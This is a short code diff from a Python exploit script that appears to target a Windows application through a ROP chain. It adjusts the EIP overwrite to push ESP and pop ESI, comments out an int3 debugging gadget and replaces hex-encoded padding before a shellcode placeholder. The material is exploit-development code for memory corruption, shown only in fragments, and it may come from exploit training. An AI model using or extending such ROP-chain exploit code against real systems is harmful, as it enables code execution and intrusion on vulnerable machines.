@@ -356,7 +356,7 @@ def main():
         # eip = pack("<L", (libeay32ibm019 + 0x00087E3B))  # (0x03117e3b) int3; int3; int3; int3; int3; ret; <- debugging
         eip = rop_push_esp_pop_esi_ret  # <- Save ESP to ESI
         log(f"DEBUG: sent_eip: {hex(struct.unpack('<L', eip)[0])}", level="!!!")
-        eip += rop_int3_int3_int3_int3_ret  # <- Debugging
+        # eip += rop_int3_int3_int3_int3_ret  # <- Debugging
         # eip = pack("<L", (0x41424345))  # push esp; pop esi; ret <- Save ESP to ESI
 
         # ! DEBUG: eip: 0x030d08d6
@@ -462,7 +462,7 @@ def main():
         #          which is not available in this case as WPM restores the default protections which were read/exec
         offset2Len = 0x600 - len(rop)
         offset2 = repeat_bytes(
-            "4f46465345542e5348454c4c434f4445", offset2Len
+            "OFFSET.SHELLCODE", offset2Len
         )  # This was calculated by subtracting lpBuffer address to the end of our ROP chain
         # shellcode = getShellcode(encoded=True)[:20]  # Get encoded shellcode, moving forward we will be using the encoded shellcode
         shellcode = rop_int3_int3_int3_int3_ret
